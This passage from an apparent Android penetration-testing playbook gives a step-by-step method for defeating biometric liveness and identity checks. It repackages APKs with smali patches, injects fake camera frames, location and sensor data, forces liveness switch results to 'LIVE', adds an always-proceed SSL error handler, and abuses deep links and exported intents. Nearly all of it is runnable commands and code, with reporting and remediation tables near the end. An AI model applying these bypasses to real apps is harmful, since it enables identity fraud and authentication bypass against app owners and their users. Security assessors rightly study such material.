2. **Prepare:** Patch APK (asset edits + smali evasion + injection hooks), install, grant permissions, push payloads
3. **Execute:** Launch, navigate flow, coordinate camera/location/sensor payloads, capture evidence
4. **Report:** Collect delivery stats, screenshots, logcat, generate report

### Coordinated Multi-Step Flow
```bash
# Phase 1: Recon
adb pull $(adb shell pm path com.target) target.apk
apktool d target.apk -o decoded/
# Run all recon grep patterns...

# Phase 2: Prepare
# Edit assets, patch smali, rebuild, sign...
adb uninstall com.target 2>/dev/null
adb install patched-aligned.apk
adb shell pm grant com.target android.permission.CAMERA
adb shell pm grant com.target android.permission.ACCESS_FINE_LOCATION
adb shell appops set com.target MANAGE_EXTERNAL_STORAGE allow
adb push ./face_frames/ /sdcard/poc_frames/
adb push ./location_config.json /sdcard/poc_location/config.json
adb push ./sensor_holding.json /sdcard/poc_sensor/config.json

# Phase 3: Execute
adb shell am start -n com.target/.LauncherActivity
adb logcat -s HookEngine FrameInterceptor LocationInterceptor SensorInterceptor

# Phase 4: Report
adb logcat -d | grep -c "FRAME_DELIVERED"
adb logcat -d | grep -c "LOCATION_DELIVERED"
adb logcat -d | grep -c "SENSOR_DELIVERED"
```

---

## 20. Automation Script Template

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PATCHES_DIR="${SCRIPT_DIR}/../smali-patches"

INPUT_APK="${1:?Usage: $0 <path-to-apk>}"
[ -f "$INPUT_APK" ] || { echo "ERROR: APK not found: $INPUT_APK" >&2; exit 1; }

WORK_DIR="$(pwd)/poc-build-$(date +%Y%m%d-%H%M%S)"
DECODED_DIR="${WORK_DIR}/decoded"

# 1. Decode
echo "[1/6] Decoding APK..."
apktool d "$INPUT_APK" -o "$DECODED_DIR" -f

# 2. Locate target package in multi-dex
TARGET_SMALI=""
for d in "$DECODED_DIR"/smali_classes*/com/target/package; do
    [ -d "$d" ] && TARGET_SMALI="$(dirname "$(dirname "$(dirname "$d")")")" && break
done
[ -n "$TARGET_SMALI" ] || { echo "ERROR: Target package not found" >&2; exit 1; }

# 3. Inject new classes
cp "$PATCHES_DIR/MyInterceptor.smali" "$TARGET_SMALI/com/target/package/"

# 4. Replace patched files (NOT sed -- use pre-verified copies)
cp "$PATCHES_DIR/TargetClass.smali" "$TARGET_SMALI/com/target/package/TargetClass.smali"

# 5. Patch manifest
MANIFEST="$DECODED_DIR/AndroidManifest.xml"
if ! grep -q "NEW_PERMISSION" "$MANIFEST"; then
    sed -i '' '/<uses-permission.*INTERNET/a\
    <uses-permission android:name="android.permission.NEW_PERMISSION"/>
' "$MANIFEST"
fi

# 6. Build + align + sign
apktool b "$DECODED_DIR" -o "${WORK_DIR}/patched.apk"
zipalign -f 4 "${WORK_DIR}/patched.apk" "${WORK_DIR}/aligned.apk"
apksigner sign --ks keystore.jks --ks-pass pass:password "${WORK_DIR}/aligned.apk"

echo "Done: ${WORK_DIR}/aligned.apk"
```

---

## 21. Evidence Collection

### What to Capture
- **Logcat**: Filter by relevant tags, timestamp all events
- **Screen recording**: `adb shell screenrecord` during the attack
- **Screenshots**: At each phase of the attack
- **Frame data**: Saved frames showing what was fed to the SDK
- **Timeline**: From app open to successful bypass, with timestamps

### Evidence Video Generation
```bash
ffmpeg -framerate 10 -i frame_%04d.png -c:v libx264 -pix_fmt yuv420p evidence.mp4
ffmpeg -i evidence.mp4 -vf "drawtext=text='%{pts\:hms}':x=10:y=10:fontsize=24:fontcolor=white" timestamped.mp4
```

### Self-Contained HTML Report
- Embed all images as base64 data URIs
- Embed videos as base64 `<video>` sources
- Use inline CSS/JS (no external dependencies)
- Verify: `grep -c 'http://' report.html` (should be 0)

---

## 22. Troubleshooting Quick Reference

### Environment
| Error | Fix |
|-------|-----|
| `command not found: java` | `brew install openjdk@21` (macOS) |
| `command not found: adb` | Add `$ANDROID_HOME/platform-tools` to PATH |
| `adb devices` shows `offline` | Wait 15-30s. If persistent: `adb kill-server && adb start-server` |

### Build & Install
| Error | Fix |
|-------|-----|
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | `adb uninstall <package>` first |
| `INSTALL_FAILED_NO_MATCHING_ABIS` | Use matching architecture (ARM APK needs ARM emulator) |
| `INSTALL_FAILED_INVALID_APK` | Re-run: `apktool b`, then `zipalign`, then `apksigner sign` |
| `zipalign: unsupported` | Run zipalign BEFORE apksigner |

### Runtime
| Symptom | Fix |
|---------|-----|
| App crashes immediately | Signature verification -- find and nop check |
| `VerifyError` in logcat | Smali register type conflict. Review edits. |
| `ClassNotFoundException` | Injected classes missing from DEX |
| "Mock location detected" | Check patch output for `isFromMockProvider` entries |
| No `FRAME_DELIVERED` | Payload directory empty or wrong path |
| `FRAME_DELIVERED` but no face detected | Frame quality too low, face too small |

### General Debug
```bash
adb logcat -d | grep -iE "exception|error|fatal|crash|tamper|integrity|signature" | tail -20
adb shell ps | grep <package>
adb logcat -d -s HookEngine | tail -5
adb shell ls -la /sdcard/poc_frames/
adb logcat -d | grep -A 30 "FATAL EXCEPTION" | head -40
```

---

## 23. Vulnerability Classification

### CWE Mapping
| CWE | Description | Example |
|-----|-------------|---------|
| CWE-345 | Insufficient verification of data authenticity | No APK integrity check, no frame source verification |
| CWE-602 | Client-side enforcement of server-side security | Client-side liveness detection |
| CWE-290 | Authentication bypass by spoofing | Replayed frames accepted as live |
| CWE-693 | Protection mechanism failure | Liveness check ineffective against replay |

### CVSS Scoring
- **Attack Vector**: Local (requires device access for APK install)
- **Attack Complexity**: Low (automated script, no special conditions)
- **Privileges Required**: None
- **User Interaction**: None
- **Scope**: Changed (bypasses authentication boundary)
- **Impact**: High confidentiality, high integrity

---

## 24. Failed Approaches (Lessons Learned)

| Approach | Why It Fails |
|----------|-------------|
| Video file injection | SDKs use ImageAnalysis API, not MediaPlayer |
| Camera2 API interposition | Too deep, breaks CameraX pipeline |
| Virtual camera (v4l2loopback) | Android doesn't support virtual camera devices |
| Xposed/Frida hooks | Fragile, some SDKs detect hooking frameworks |
| Direct JNI calls | Session state required, can't skip managed layer |
| sed-based smali injection | Register type conflicts cause VerifyError |
| Wrong frame format | Must match exact resolution, color format, orientation |
| `const` values violating physics | `sqrt(accelX^2+accelY^2+accelZ^2)` must be ~9.81 |

---

## 25. Common Attack Surfaces

### Biometric Authentication
- Camera frame pipeline (ImageAnalysis, Camera2)
- Liveness detection (client-side verdict, server-side validation)
- Biometric prompt (system BiometricPrompt callbacks)
- Face embedding extraction (JNI native libraries)

### Certificate Pinning
- OkHttp CertificatePinner
- Network security config (`network_security_config.xml`)
- Custom TrustManager implementations
- Conscrypt / BoringSSL native pins

### Root / Tamper Detection
- SafetyNet / Play Integrity API
- Custom root detection (file checks, su binary, build props)
- Signature verification at runtime
- Debug detection (debuggable flag, JDWP)

### Data Storage
- SharedPreferences (often unencrypted)
- SQLite databases (check for SQLCipher)
- Internal storage files
- KeyStore entries

### App Assets
- JSON configs with thresholds and feature flags
- ML models (.tflite, .onnx)
- Firebase Remote Config defaults
- Properties/config files with API endpoints

---

## 26. Smali Debugging & Runtime Tracing

### Inserting Log Statements
The fastest way to trace execution through patched smali. Requires bumping `.locals` by 2.

```smali
# Add at any point in a method to trace execution
const-string v0, "SmaliDebug"
const-string v1, ">>> Reached checkpoint A in TargetClass.verify()"
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

```smali
# Log a register value (object -- calls toString())
const-string v0, "SmaliDebug"
invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;
move-result-object v1
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

```smali
# Log a boolean register (v5 holds 0 or 1)
const-string v0, "SmaliDebug"
invoke-static {v5}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;
move-result-object v1
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

```smali
# Log an integer register
const-string v0, "SmaliDebug"
invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
move-result-object v1
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
```

### Monitoring Logs
```bash
# Filter for debug traces only
adb logcat -s SmaliDebug:D

# Combine with hook engine tags
adb logcat -s SmaliDebug:D HookEngine:D FrameInterceptor:D

# Dump and search
adb logcat -d | grep "SmaliDebug" | tail -50

# Clear logs before a test run
adb logcat -c
```

### JDWP Debugging (Full Debugger)
```bash
# 1. Make app debuggable (in decoded AndroidManifest.xml)
#    Add android:debuggable="true" to <application> tag

# 2. Rebuild, sign, install

# 3. Find the JDWP process
adb jdwp                           # lists debuggable PIDs
adb shell ps | grep <package>      # find your PID

# 4. Forward JDWP port
adb forward tcp:8700 jdwp:<PID>

# 5. Attach with jdb
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700

# 6. In jdb: set breakpoints, inspect variables
# > stop in com.target.VerifyActivity.onResume
# > locals
# > print this.authToken
```

### Smalidea Plugin (IntelliJ / Android Studio)
1. Install `smalidea-*.zip` from https://github.com/pxb1988/smalidea (or JesusFreke/smali releases)
2. Open decoded APK directory as a project in IntelliJ
3. Mark `smali*/` directories as source roots
4. Set breakpoints directly in `.smali` files
5. Attach to running debuggable process via Run > Attach to Process

### Bisect Strategy for Broken Patches
When a multi-patch build crashes and you don't know which patch broke it:
1. Start with ONLY the manifest patch (debuggable + permissions). Verify app launches.
2. Add smali patches one at a time, rebuild and test after each.
3. If applying multiple file patches, use binary search -- apply half, test, narrow down.
4. When found, add Log statements around the broken patch to pinpoint the exact instruction.

### Stack Trace Reading
```bash
# Get crash trace
adb logcat -d | grep -A 40 "FATAL EXCEPTION"

# Key lines to look for:
#   java.lang.VerifyError       -> smali register type conflict
#   java.lang.ClassNotFoundException -> missing injected class
#   java.lang.NoSuchMethodError -> wrong method signature in hook
#   java.lang.NullPointerException -> register was null at hook point
```

Map the stack trace class/method/line back to your smali:
```bash
# The line number in the trace corresponds to .line directives in smali
grep -n "\.line 42" decoded/smali/com/target/TargetClass.smali
```

---

## 27. Advanced Reconnaissance

### jadx Decompilation Workflow
```bash
# CLI decompile to directory (for grep/search)
jadx -d jadx-output/ target.apk

# GUI for interactive browsing
jadx-gui target.apk

# Export gradle project (can import into Android Studio)
jadx -e -d jadx-project/ target.apk
```

**Cross-referencing jadx with smali:**
1. Find the class/method in jadx (readable Java/Kotlin)
2. Understand the logic
3. Open the same class in `decoded/smali*/` to make the actual patch
4. jadx line numbers don't match smali `.line` directives -- navigate by method name

### String-Based Navigation (Obfuscated Code)
When classes are obfuscated to `a.b.c`, use visible strings as anchors:

```bash
# 1. Find a visible UI string (e.g., "Verification failed")
grep -r "Verification failed" decoded/res/values/strings.xml
# Result: <string name="error_verification">Verification failed</string>

# 2. Find the resource ID for that string
grep "error_verification" decoded/res/values/public.xml
# Result: <public type="string" name="error_verification" id="0x7f0e002a" />

# 3. Search smali for that hex ID
grep -rn "0x7f0e002a" decoded/smali*/
# Result: smali_classes2/a/b/c.smali:142: const v2, 0x7f0e002a
# Now you know a/b/c is the verification class

# 4. Read that class to understand the full flow
```

### Call Graph Tracing
Trace a data flow from UI to server to find the right hook point:

```bash
# 1. Find the button click handler (look for onClick or lambda)
grep -rn "onClick\|setOnClickListener" decoded/smali*/com/target/VerifyActivity.smali

# 2. Follow the invoked method
grep -rn "invoke-.*verify\|invoke-.*submit\|invoke-.*authenticate" decoded/smali*/com/target/

# 3. Trace into that method -- what does it call?
grep -n "invoke-" decoded/smali*/com/target/VerifyManager.smali

# 4. Look for the SDK entry point
grep -rn "invoke-.*facetec\|invoke-.*iproov\|invoke-.*liveness" decoded/smali*/
```

**Pattern:** UI Activity -> ViewModel/Presenter -> Manager/Repository -> SDK API call. Hook at the narrowest point (usually the Manager layer).

### ProGuard Mapping File Recovery
```bash
# Check if mapping is bundled (rare but happens)
unzip -l target.apk | grep -i mapping

# Check assets directory
find decoded/assets/ -name "mapping*" -o -name "*.map" 2>/dev/null

# If found, reverse-map obfuscated names:
# a.b.c -> com.target.security.IntegrityChecker
# Use retrace (from R8/ProGuard):
retrace mapping.txt stacktrace.txt
```

### Exported Component Analysis
```bash
# All exported components (activities, services, receivers, providers)
grep -B5 'exported="true"' decoded/AndroidManifest.xml

# Intent filters (implicitly exported on older targetSdk)
grep -B2 -A10 '<intent-filter' decoded/AndroidManifest.xml

# Deep links
grep -A5 'android:scheme=' decoded/AndroidManifest.xml

# Content providers (data extraction surface)
grep -A10 '<provider' decoded/AndroidManifest.xml

# Test exported activities via adb
adb shell am start -n <package>/<activity-class>
adb shell am start -a android.intent.action.VIEW -d "scheme://deeplink/path"
```

### Network Traffic Recon
```bash
# 1. Patch network_security_config.xml to trust user certs (see Section 10)
# 2. Install proxy CA cert on device
adb push burp-ca.der /sdcard/
# Settings > Security > Install from storage

# 3. Set proxy on device
adb shell settings put global http_proxy <host>:<port>

# 4. Run app through the flow, observe:
#    - Which endpoints are called
#    - What payload format (JSON fields, image uploads)
#    - What headers (auth tokens, device fingerprints)
#    - Whether liveness result is sent client-side or server-computed

# 5. Clear proxy when done
adb shell settings put global http_proxy :0
```

**Why this matters for hook selection:** If the server receives raw frames and computes liveness server-side, you need frame injection. If the client sends a liveness verdict boolean, you can just patch that field.

---

## 28. Smali Control Flow Patterns

### Try-Catch Blocks
```smali
:try_start_0
invoke-virtual {v0}, Lcom/target/Checker;->verify()Z
move-result v1
:try_end_0

.catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

goto :label_continue

:catch_0
# Exception handler -- many apps silently swallow failures here
# or call a "fail safe" path that you can also hook
move-exception v2
invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
move-result-object v3
```

**Key insight:** Some integrity checks wrap their logic in try-catch and treat exceptions as "check passed" (fail-open) or "check failed" (fail-closed). Read the catch handler to know which.

**Patching around try-catch:**
- To skip a check entirely: replace the try block body with the desired return/nop
- To force the exception path: insert `throw v0` with a new exception instance
- To force the non-exception path: nop the `.catch` directive (removes handler registration)

### Switch Statements
```smali
# Packed switch (contiguous values 0,1,2,3...)
packed-switch v0, :pswitch_data_0

# Sparse switch (arbitrary values)
sparse-switch v0, :sswitch_data_0

# The data tables appear at end of method:
:pswitch_data_0
.packed-switch 0x0
    :pswitch_0    # case 0 -> LIVE
    :pswitch_1    # case 1 -> SPOOF
    :pswitch_2    # case 2 -> INDETERMINATE
.end packed-switch

:sswitch_data_0
.sparse-switch
    0x1 -> :sswitch_0   # SUCCESS
    0x2 -> :sswitch_1   # FAILURE
    0xd -> :sswitch_2   # TIMEOUT
.end sparse-switch
```

**Patching switches:** Change the jump target to always go to the success case:
```smali
# Force all cases to jump to :pswitch_0 (LIVE)
:pswitch_data_0
.packed-switch 0x0
    :pswitch_0
    :pswitch_0
    :pswitch_0
.end packed-switch
```

### Wide Registers (long / double)
`J` (long) and `D` (double) types occupy TWO consecutive registers. This is a major source of off-by-one register bugs.

```smali
# v0+v1 together hold the long value
invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
move-result-wide v0
# v0 and v1 are BOTH consumed. Next free register is v2.

# WRONG: using v1 after a wide assignment to v0 corrupts the long
const-string v1, "tag"    # BREAKS the long in v0/v1
```

**Rule:** After `move-result-wide vN`, both `vN` and `vN+1` are occupied. Plan register allocation accordingly.

### Conditional Patterns
```smali
# if-eqz = if (v0 == 0)  -- branch taken when zero/null/false
# if-nez = if (v0 != 0)  -- branch taken when non-zero/non-null/true
# if-eq  = if (v0 == v1)
# if-ne  = if (v0 != v1)
# if-lt  = if (v0 < v1)
# if-ge  = if (v0 >= v1)
# if-gt  = if (v0 > v1)
# if-le  = if (v0 <= v1)

# Common pattern: boolean check method
invoke-virtual {v0}, Lcom/target/Check;->isValid()Z
move-result v1
if-eqz v1, :check_failed    # if false, jump to failure
# ... success path ...
:check_failed
# ... failure path ...

# Quick bypass: flip if-eqz to if-nez (inverts the condition)
# Or: nop the entire branch instruction (always falls through to success)
```

---

## 29. Kotlin-Specific Smali Patterns

### Kotlin Compiler Artifacts
Kotlin adds boilerplate that clutters smali. Recognize and navigate around it:

| Kotlin Feature | Smali Artifact |
|---------------|---------------|
| Null safety | `Intrinsics.checkNotNullParameter(p1, "param")` at method entry |
| Default args | `method$default(...)` static variant with bitmask parameter |
| Companion object | Inner class `ClassName$Companion` with static-like methods |
| Data class | `copy()`, `copy$default()`, `component1()..componentN()`, `toString()`, `hashCode()`, `equals()` |
| Sealed class | Abstract parent + inner classes for each variant |
| Lambda | `ClassName$methodName$1` anonymous inner class implementing `Function0`/`Function1`/etc. |
| Extension function | First parameter is the receiver type (appears as a normal static method) |
| Property delegation | `$$delegatedProperties` field array, `getValue`/`setValue` calls |
| `when` expression | Chain of `if-eq`/`if-eqz` or `packed-switch`/`sparse-switch` |
| `object` singleton | `INSTANCE` static field, private constructor, `<clinit>` initializer |

### Navigating Kotlin Null Checks
```smali
# Kotlin inserts this at every method entry for non-null params:
const-string v0, "context"
invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

# These are safe to ignore -- they just throw NPE if param is null.
# When reading smali, skip all Intrinsics.check* calls to find the real logic.
```

### Coroutine State Machines
Kotlin `suspend` functions compile to a state machine with a `Continuation` parameter:

```smali
# Original Kotlin: suspend fun verify(): Boolean
# Compiled smali signature:
.method public final verify(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;

# Inside: a switch on the state machine label field
iget v0, p1, Lcom/target/VerifyKt$verify$1;->label:I
packed-switch v0, :pswitch_data_0
# State 0: start
# State 1: after first suspension point
# State 2: after second suspension point
```

**Strategy:** Don't patch inside coroutine state machines -- they are fragile and hard to reason about. Instead:
1. Hook the **caller** of the suspend function (before it's invoked)
2. Hook the **result consumer** (after the coroutine completes)
3. Or hook the non-suspend helper methods that the coroutine calls internally

### Kotlin Companion Objects
```smali
# Kotlin: class Config { companion object { fun isDebug(): Boolean } }
# In smali, the companion is a separate class:
# Config$Companion.smali -> method isDebug()Z

# But callers invoke via the companion field:
sget-object v0, Lcom/target/Config;->Companion:Lcom/target/Config$Companion;
invoke-virtual {v0}, Lcom/target/Config$Companion;->isDebug()Z
move-result v1
```

**To patch:** Edit `Config$Companion.smali`, not `Config.smali`.

### Kotlin `when` / Sealed Class Result Mapping
```kotlin
// Kotlin source (what jadx shows you):
when (result) {
    LivenessResult.LIVE -> handleSuccess()
    LivenessResult.SPOOF -> handleFailure()
    LivenessResult.TIMEOUT -> handleRetry()
}
```

```smali
# In smali this becomes ordinal-based switch:
invoke-virtual {v0}, Lcom/target/LivenessResult;->ordinal()I
move-result v1
packed-switch v1, :pswitch_data_0
# Patch the switch data to always jump to handleSuccess label
```

### Lambda / SAM Conversion
```smali
# Kotlin lambda: { result -> processResult(result) }
# Compiles to anonymous inner class:
# VerifyActivity$onResume$1.smali  (implements Function1)
#   .method public final invoke(Ljava/lang/Object;)Ljava/lang/Object;

# The actual logic is in the invoke() method of the lambda class.
# Find it by:
grep -rn "VerifyActivity\$" decoded/smali*/com/target/
```

---

## 30. Split APK / App Bundle Handling

### Identifying Split APKs
```bash
# Check if app is installed as split
adb shell pm path <package>
# If output shows multiple paths:
#   /data/app/<package>/base.apk
#   /data/app/<package>/split_config.arm64_v8a.apk
#   /data/app/<package>/split_config.en.apk
#   /data/app/<package>/split_config.xxhdpi.apk
```

### Pulling All Splits
```bash
# Pull all APK files for the package
PKG=com.target.app
APKS_DIR=$(adb shell pm path $PKG | head -1 | sed 's/package://;s/base.apk//')
adb shell ls "$APKS_DIR"
for apk in $(adb shell ls "$APKS_DIR" | tr -d '\r'); do
    adb pull "${APKS_DIR}${apk}" "./${apk}"
done
```

### What's in Each Split
| Split | Contents |
|-------|---------|
| `base.apk` | Main code (DEX), manifest, core resources, core assets |
| `split_config.arm64_v8a.apk` | Native `.so` libraries for arm64 |
| `split_config.armeabi_v7a.apk` | Native `.so` libraries for arm32 |
| `split_config.en.apk` | English string resources |
| `split_config.xxhdpi.apk` | High-density drawable resources |
| `split_*.apk` (feature) | Dynamic feature module code + resources |

### Merging for Analysis
```bash
# Option 1: Decode base.apk (contains all DEX and most logic)
apktool d base.apk -o decoded/ -f
# Then decode specific splits for native libs or resources:
apktool d split_config.arm64_v8a.apk -o decoded-arm64/ -f
cp -r decoded-arm64/lib/ decoded/lib/

# Option 2: Use bundletool to merge into universal APK
# (requires the .aab file, usually only available to the developer)
bundletool build-apks --bundle=app.aab --output=app.apks --mode=universal
unzip app.apks -d apks/
# apks/universal.apk is a single mergable APK
```

### Patching Split APKs
For most engagements, patch `base.apk` only:
1. `apktool d base.apk -o decoded/`
2. Apply smali/asset patches
3. `apktool b decoded/ -o patched-base.apk`
4. Sign and install: `adb install-multiple patched-base.apk split_config.arm64_v8a.apk split_config.en.apk`

**Important:** All splits must be signed with the same key. Re-sign ALL of them:
```bash
for apk in patched-base.apk split_config.*.apk; do
    zipalign -f 4 "$apk" "aligned-$apk"
    apksigner sign --ks debug.keystore --ks-key-alias poc \
      --ks-pass pass:poctest123 "aligned-$apk"
done
adb install-multiple aligned-patched-base.apk aligned-split_config.*.apk
```

---

## 31. WebView / Hybrid App Attacks

### Recon for WebView Usage
```bash
# Find WebView classes
grep -rn "WebView\|WebViewClient\|WebChromeClient" decoded/smali*/

# Find loadUrl calls (what URLs are loaded)
grep -rn "loadUrl\|loadData\|loadDataWithBaseURL" decoded/smali*/

# Find JavaScript interfaces (bridge between JS and Java)
grep -rn "addJavascriptInterface\|@JavascriptInterface\|JavascriptInterface" decoded/smali*/

# Find WebView settings
grep -rn "setJavaScriptEnabled\|setAllowFileAccess\|setDomStorageEnabled" decoded/smali*/
```

### Enable WebView Debugging
Inject into `Application.onCreate()` or the Activity that hosts the WebView:
```smali
# Enable Chrome DevTools for all WebViews in the app
const/4 v0, 0x1
invoke-static {v0}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```
Then open `chrome://inspect` on desktop Chrome to attach DevTools.

### JavaScript Interface Exploitation
```bash
# Find registered JS interfaces
grep -rn "addJavascriptInterface" decoded/smali*/
# Result: invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
# v1 = Java object exposed, v2 = JS namespace name

# Find the exposed methods (annotated with @JavascriptInterface)
# The class of v1 will have methods with .annotation Landroid/webkit/JavascriptInterface;
grep -B5 "JavascriptInterface" decoded/smali*/com/target/*.smali
```

### Patching JavaScript Assets
```bash
# Find JS files in assets
find decoded/assets/ -name "*.js" -o -name "*.html" 2>/dev/null

# Common targets:
# - Liveness check JS (modify validation logic)
# - Config JS (change endpoints, disable features)
# - Webpack bundles (search for key strings, modify in place)

# Edit directly:
vi decoded/assets/www/js/liveness.js
# Rebuild APK normally
```

### WebView SSL Bypass
```smali
# Find the WebViewClient.onReceivedSslError implementation
# Replace with: always proceed (accept any certificate)
.method public onReceivedSslError(Landroid/webkit/WebView;Landroid/webkit/SslErrorHandler;Landroid/net/http/SslError;)V
    .locals 0
    invoke-virtual {p2}, Landroid/webkit/SslErrorHandler;->proceed()V
    return-void
.end method
```

---

## 32. Intent / IPC Attack Surface

### Launching Exported Components
```bash
# Start an exported activity directly (bypass normal navigation)
adb shell am start -n <package>/<activity>
adb shell am start -n com.target/.debug.DebugActivity

# Start with extras
adb shell am start -n <package>/<activity> \
  --es "token" "fake-token" \
  --ez "isVerified" true \
  --ei "userId" 12345

# Send a broadcast
adb shell am broadcast -a com.target.ACTION_VERIFY_COMPLETE \
  --es "result" "success"

# Start a service
adb shell am startservice -n <package>/<service>
```

### Deep Link Exploitation
```bash
# Find deep link schemes in manifest
grep -A5 'android:scheme=' decoded/AndroidManifest.xml

# Test deep links
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://verify?status=approved&token=bypass"

# Common exploit: deep link directly to post-verification screen
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://dashboard"
```

### Content Provider Data Extraction
```bash
# Find content providers
grep -A10 '<provider' decoded/AndroidManifest.xml

# Query exported providers
adb shell content query --uri content://<authority>/<path>

# Check for path-permission gaps
grep -A15 'android:authorities' decoded/AndroidManifest.xml
```

### PendingIntent Interception
```bash
# Find PendingIntent creation
grep -rn "PendingIntent\|getActivity\|getBroadcast\|getService" decoded/smali*/

# Look for mutable PendingIntents (targetSdk < 31 or FLAG_MUTABLE)
grep -rn "FLAG_MUTABLE\|0x02000000" decoded/smali*/
```

---

## 33. Frida for Reconnaissance (Complementary Tool)

### When to Use Frida vs. Smali
| Scenario | Use Frida | Use Smali Patch |
|----------|-----------|----------------|
| Quick method tracing / discovery | Yes | No |
| Discovering argument values at runtime | Yes | Verbose (Log.d) |
| Final persistent bypass | No | Yes |
| SDK detects hooking frameworks | No | Yes |
| Speed of iteration (testing ideas) | Fast | Slow (rebuild cycle) |
| Production-like PoC delivery | No | Yes |

**Best practice:** Use Frida for recon, then commit to smali patches for the final deliverable.

### Quick Method Tracing
```javascript
// frida -U -f <package> -l trace.js
Java.perform(function() {
    var TargetClass = Java.use("com.target.security.IntegrityChecker");

    // Trace a specific method
    TargetClass.isValid.implementation = function() {
        var result = this.isValid();
        console.log("[*] isValid() called, returned: " + result);
        console.log(Java.use("android.util.Log").getStackTraceString(
            Java.use("java.lang.Exception").$new()));
        return result;
    };
});
```

### Discover Method Arguments
```javascript
Java.perform(function() {
    var Checker = Java.use("com.target.LivenessChecker");
    Checker.checkResult.implementation = function(code, confidence, sessionId) {
        console.log("[*] checkResult(" + code + ", " + confidence + ", " + sessionId + ")");
        return this.checkResult(code, confidence, sessionId);
    };
});
```

### Enumerate Loaded Classes
```javascript
// Find all classes matching a pattern
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.includes("liveness") || className.includes("Liveness")) {
                console.log("[*] " + className);
            }
        },
        onComplete: function() {}
    });
});
```

### Frida Detection Indicators
Apps may detect Frida via:
- Port scanning (default Frida port 27042)
- `/proc/self/maps` scanning for `frida-agent`
- Named pipe detection (`linjector`)
- `dlopen` hooking detection

**If detected:** Fall back to pure smali approach. The Frida recon data you gathered is still valid.

---

## 34. Play Integrity / SafetyNet Handling

### How Play Integrity Works
```text
App -> Play Integrity API (device-level) -> Google servers -> signed attestation token
App sends token to its backend -> Backend verifies with Google -> Pass/Fail

Three verdict levels:
  MEETS_BASIC_INTEGRITY    -- not rooted, not emulated
  MEETS_DEVICE_INTEGRITY   -- certified device, locked bootloader
  MEETS_STRONG_INTEGRITY   -- hardware-backed attestation
```

### Why Pure Smali Can't Fully Bypass
The attestation is **server-side verified**. Google signs the verdict, and the app's backend checks that signature. You cannot forge Google's signature.

### What You CAN Do
```bash
# 1. Find where the app CONSUMES the attestation result
grep -rn "IntegrityTokenResponse\|getToken\|integrityToken\|SafetyNet\|safetynet" decoded/smali*/

# 2. Find the client-side decision point
grep -rn "MEETS_DEVICE_INTEGRITY\|MEETS_BASIC_INTEGRITY\|isDeviceIntegrity" decoded/smali*/

# 3. Nop the client-side enforcement
# Many apps check BOTH client-side and server-side.
# Client-side check often gates UI flow before server check.
# Nop the client-side gate -> app proceeds to server check -> may still fail

# 4. Find the callback that handles the server's response
grep -rn "onIntegrity\|onAttestation\|integrityResult\|attestationResult" decoded/smali*/
```

### Common Patterns
| Pattern | Bypassable? | Approach |
|---------|-------------|----------|
| Client-only check (no server verification) | Yes | Nop the check or force return true |
| Client gates UI, server verifies | Partial | Nop client gate; server will still reject |
| Server-only (token sent in API call) | No (smali) | Would need to intercept and replace token |
| Graceful degradation (warns but continues) | Yes | Nop the warning/dialog |

### SafetyNet (Legacy, Still Common)
```bash
# Find SafetyNet calls
grep -rn "SafetyNet\|safetyNetClient\|attest\|AttestationResponse" decoded/smali*/

# Find the JWS token parsing
grep -rn "parseJws\|ctsProfileMatch\|basicIntegrity" decoded/smali*/
```

---

## 35. Reporting & Severity Assessment

### Report Structure
```
1. Executive Summary
   - Scope, target app, assessment dates, key findings count

2. Methodology
   - Tools used, approach (static analysis + dynamic testing + APK patching)

3. Findings (per vulnerability)
   - Title, severity, CWE ID
   - Description (what's wrong)
   - Reproduction steps (exact commands)
   - Evidence (screenshots, logcat, screen recordings)
   - Impact (what an attacker gains)
   - Remediation (how to fix)

4. Risk Summary Table
   - All findings ranked by severity

5. Appendices
   - Tool versions, device info, full logcat excerpts
```

### Severity Rating by Finding Type
| Finding | Typical CVSS | Severity | Rationale |
|---------|-------------|----------|-----------|
| Camera frame injection bypasses liveness | 7.7 - 8.1 | High | Authentication bypass, identity fraud |
| Client-side liveness verdict override | 8.1 - 8.6 | High-Critical | Full auth bypass, trivial to exploit |
| Location spoofing bypasses geofence | 5.5 - 6.8 | Medium | Bypasses geographic restriction |
| Sensor injection bypasses liveness | 6.0 - 7.0 | Medium-High | Supports frame injection attack |
| Hardcoded API keys in assets | 5.0 - 6.5 | Medium | Information disclosure, API abuse |
| Missing APK signature verification | 7.5 - 8.0 | High | Enables all other attacks |
| Disabled certificate pinning | 4.0 - 5.5 | Medium | Enables MITM |
| Exported activities skip auth | 6.5 - 7.5 | Medium-High | Navigation bypass |
| ML model replacement | 7.0 - 8.0 | High | Disables biometric verification |

### Remediation Recommendations
| Attack | Remediation |
|--------|-------------|
| APK repackaging | Server-side signature verification via Play Integrity |
| Frame injection | Server-side liveness (send encrypted frames to server) |
| Client-side liveness | Move verdict computation to server |
| Location spoofing | Server-side location correlation, geofence enforcement server-side |
| Asset manipulation | Encrypt assets with server-fetched key, integrity-check at load |
| Certificate pinning bypass | Pin in native code, use Play Integrity for device trust |
